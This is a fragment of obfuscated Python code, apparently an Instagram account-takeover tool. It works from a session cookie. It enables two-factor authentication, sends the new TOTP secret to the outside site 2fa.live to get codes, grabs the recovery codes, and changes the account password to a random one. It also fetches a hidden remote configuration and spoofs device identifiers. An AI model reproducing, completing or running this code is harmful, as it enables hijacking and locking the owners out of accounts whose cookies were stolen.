            _Ai: re.search("__comet_req=(\\d+)", str(A)).group(1),
            "fb_dtsg": re.search(_An, str(A)).group(1),
            "jazoest": re.search("jazoest=(\\d+)", str(A)).group(1),
            "lsd": re.search(_l, str(A)).group(1),
            "__spin_r": re.search(_Ao, str(A)).group(1),
            "__spin_b": "trunk",
            "__spin_t": re.search(_Ap, str(A)).group(1),
            _AM: _AN,
            _j: _Aq,
            _Aj: "true",
            _k: "6888165191230459",
        }
        return B

    def headers_graph(B, xxx):
        A = {
            _m: _Aq,
            _I: _AO,
            _C: "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
            _Y: _c,
            _AA: re.search(_l, str(xxx)).group(1),
            _p: "*/*",
        }
        return A

    def TahapPertama2f(A, cokie, url=_Ar):
        I = "Kode Authentikasi Tidak Ada"
        H = "useFXSettingsTwoFactorGenerateTOTPKeyMutation"
        C = cokie
        try:
            B = requests.Session().get(url, cookies={_J: C}).text
            E = A.headers_graph(B)
            E.update(
                {_W: _AB, _C: _AG, _m: H, _Y: _c, _AA: re.search(_l, str(B)).group(1), _I: _AO}
            )
            F = A.data_graph(B)
            F.update(
                {
                    _AM: _AN,
                    _j: H,
                    _AC: json.dumps(
                        {
                            "input": {
                                _As: f"{A.ClientId(B)}",
                                "actor_id": f"{A.AccountId(B)}",
                                _At: f"{A.AccountId(B)}",
                                _Au: _Av,
                                _AD: _AE,
                                "fdid": _AE,
                            }
                        }
                    ),
                    _k: "6282672078501565",
                }
            )
            G = requests.post(_AF, data=F, headers=E, cookies={_J: C}).text
            if "totp_key" in str(G):
                J = re.search('"key_text":"(.*?)"', str(G)).group(1)
                D = J.replace(_S, "")
                K = requests.get(f"https://2fa.live/tok/{D}").json()["token"]
                A.info.update({_V: D})
                A.AktifkanA2f(C, K, B, D)
            else:
                A.info.update({_V: I})
                A.info.update({_P: _H})
                A.info.update({_G: _n})
        except Exception as L:
            A.info.update({_V: I})
            A.info.update({_P: _H})
            A.info.update({_G: _n})
        return A.info

    def AktifkanA2f(A, cokie, code, resp, auth):
        H = '"actorID":"(\\d+)"'
        G = "useFXSettingsTwoFactorEnableTOTPMutation"
        D = cokie
        B = resp
        try:
            C, I = (
                B,
                "Instagram 163.0.0.45.122 Android (28/9; 440dpi; 1080x2130; Xiaomi/xiaomi; Redmi Note 8; ginkgo; qcom; ru_RU; 250742113)",
            )
            E = A.headers_graph(B)
            E.update({_W: _AB, _I: _AO, _AA: re.search(_l, str(B)).group(1), _Y: _c, _C: I, _m: G})
            J = {
                "av": A.AccountId(B),
                "__user": _T,
                "__a": _L,
                _AL: "14",
                "__hs": re.search(_Al, str(C)).group(1),
                "dpr": _M,
                "__ccg": "GOOD",
                "__rev": re.search('{"rev":(.*?)}', str(C)).group(1),
                "__hsi": re.findall(_Am, str(C))[0],
                _Ai: "24",
                "fb_dtsg": re.search(_An, str(C)).group(1),
                "jazoest": re.findall("&jazoest=(\\d+)", str(C))[0],
                "lsd": re.search(_l, str(C)).group(1),
                "__spin_r": re.findall(_Ao, str(C))[0],
                "__spin_b": "trunk",
                "__spin_t": re.findall(_Ap, str(C))[0],
                _AM: _AN,
                _j: G,
                _AC: json.dumps(
                    {
                        "input": {
                            _As: re.search(_Aw, str(B)).group(1),
                            "actor_id": re.findall(H, str(B))[0],
                            _At: re.findall(H, str(B))[0],
                            _Au: _Av,
                            "verification_code": code,
                            _AD: _AE,
                            "fdid": _AE,
                        }
                    }
                ),
                _Aj: "true",
                _k: "7032881846733167",
            }
            K = requests.Session().post(_AF, data=J, headers=E, cookies={_J: D}).text
            if _Ax in str(K):
                A.info.update({_P: _A})
                F = A.get_code(D, B)
                if F is not _B:
                    try:
                        L = F[_t]["xfb_two_factor_regenerate_recovery_codes"]["recovery_codes"]
                        A.info.update({_G: L})
                    except:
                        A.info.update({_G: _n})
                else:
                    A.info.update({_G: _n})
            else:
                A.info.update({_P: _H})
                A.info.update({_G: _n})
        except Exception as M:
            A.info.update({_P: _H})
            A.info.update({_G: "Kode Pemulihan Tidak ada"})

    def AccountId(A, xxx):
        try:
            B = re.search(_Ak, str(xxx)).group(1)
            return B
        except AttributeError:
            return ""
        except requests.exceptions.ConnectionError:
            time.sleep(5)
            A.AccountId(xxx)

    def ClientId(A, xxx):
        try:
            B = re.search(_Aw, str(xxx)).group(1)
            return B
        except AttributeError:
            return ""
        except requests.exceptions.ConnectionError:
            time.sleep(5)
            A.ClientId(xxx)

    def get_code(A, cokie, response):
        F = "Not_A"
        B = response
        try:
            C = A.data_graph(B)
            G = A.ClientId(B)
            D = C["av"]
            C.update(
                {
                    _AL: "t",
                    "__s": "",
                    "__dyn": "",
                    "__csr": "",
                    _j: "useFXSettingsTwoFactorRegenerateRecoveryCodesMutation",
                    _AC: '{"input":{"client_mutation_id":"'
                    + G
                    + '","actor_id":"'
                    + D
                    + '","account_id":"'
                    + D
                    + '","account_type":"INSTAGRAM","fdid":"device_id_fetch_ig_did"}}',
                    _k: "24010978991879298",
                }
            )
            E = A.headers_graph(B)
            E.update(
                {
                    _W: _AB,
                    "sec-ch-ua": F,
                    _I: _AR,
                    "sec-ch-ua-mobile": "?0",
                    _C: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "viewport-width": "980",
                    _m: "useFXSettingsTwoFactorFetchRecoveryCodesMutation",
                    _AA: "7g42wKUg5uJbzrClbnTyuB",
                    _Y: _c,
                    _AP: "129477",
                    "dpr": _M,
                    "sec-ch-ua-full-version-list": F,
                    "sec-ch-prefers-color-scheme": "light",
                    "sec-ch-ua-platform": "Linux",
                    _p: "*/*",
                    "origin": "https://accountscenter.instagram.com",
                    _Ab: "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://accountscenter.instagram.com/password_and_security/two_factor/",
                    _AH: "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                }
            )
            H = requests.post(_AF, cookies={_J: cokie}, data=C, headers=E).json()
            return H
        except Exception as I:
            return

    def OverPower(A):
        D = "null"
        C = "meta"
        B = "curl"
        while _A:
            try:
                A.uid = str(uuid.uuid4())
                A.ps = requests.get(zlib.decompress(KamuNya)).json()
                A.GerryDev.update(
                    {
                        _t: A.ps["xyraacode"]["MidConfig"],
                        B: A.ps["CURLpost"]["xyraacodeURL"],
                        C: A.ps["Headers"]["xyraacodeHEAD"],
                    }
                )
                A.data = A.GerryDev[_t]
                A.data.update(
                    {_AD: _A9 % A.Android_ID(D, D).hexdigest()[:16], "custom_device_id": str(A.uid)}
                )
                A.meta = A.GerryDev[C]
                A.meta.update(
                    {
                        _U: str(A.uid),
                        _E: str(A.data[_AD]),
                        _h: str(A.timezone_offset()),
                        _X: str(len(A.data)),
                    }
                )
                A.resp = requests.post(A.GerryDev[B], data=A.data, headers=A.meta)
                A.appc = A.resp.headers["ig-set-x-mid"]
                if A.appc not in A.MID:
                    if len(A.MID) < 6:
                        A.MID.append(A.appc)
                    else:
                        break
            except:
                break

    def PasswordNEW(A):
        A.abd = ["ABCDEFGHIJKLMNOPQRSTUVWXYZ", "abcdefghijklmnopqrstuvwxyz"]
        A.san = "".join(random.choice(random.choice(A.abd)) for B in range(12))
        return A.san

    def SandiBaru(A, cookie, old_pw):
        J = "#PWD_BROWSER:0:{}:{}"
        I = "useFXSettingsChangePasswordMutation"
        F = old_pw
        E = cookie
        try:
            B = requests.get(_Ar, cookies={_J: E}).text
            G = A.headers_graph(B)
            G.update({_W: _AB, _m: I, _C: _AG})
            C = A.data_graph(B)
            H = J.format(int(time.time()), F)
            A.sand = A.PasswordNEW()
            D = J.format(int(time.time()), A.sand)
            C.update(
                {
                    _j: I,
                    _AC: '{"account_id":"'
                    + C["av"]
                    + '","account_type":"INSTAGRAM","current_password_enc":{"sensitive_string_value":"'
                    + str(H)
                    + '"},"new_password_enc":{"sensitive_string_value":"'
                    + str(D)
                    + '"},"new_password_confirm_enc":{"sensitive_string_value":"'
                    + str(D)
                    + '"},"client_mutation_id":"'
                    + A.ClientId(B)
                    + '","should_logout":false}',
                    _k: "6616377658461852",
                }
            )
            K = requests.post(_AF, cookies={_J: E}, data=C, headers=G).text
            if _Ax in str(K):
                return D.split(_O)[3]
            else:
                return H.split(_O)[3]
        except:
            return F
